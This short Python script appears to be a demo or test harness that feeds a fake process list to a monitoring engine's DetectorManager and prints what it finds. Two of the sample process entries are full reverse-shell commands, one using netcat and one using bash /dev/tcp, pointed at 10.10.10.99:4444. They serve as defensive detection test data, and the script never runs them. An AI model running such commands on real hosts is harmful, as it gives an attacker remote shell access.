from monitoring_engine.detector.manager import DetectorManager


def main():
    context = {
        "metrics": {
            "processes": [
                {"cmdline": "python app.py"},
                {"cmdline": "nc -e /bin/sh 10.10.10.99 4444"},
                {"cmdline": "bash -i >& /dev/tcp/10.10.10.99/4444 0>&1"},
                {"cmdline": "nginx: worker process"},
            ]
        },
        "config": {
            "detector": {
                "auth_trace": {
                    "threshold": 3
                }
            }
        }
    }

    manager = DetectorManager()
    findings = manager.run_all(context)

    for item in findings:
        print(item)


if __name__ == "__main__":
    main()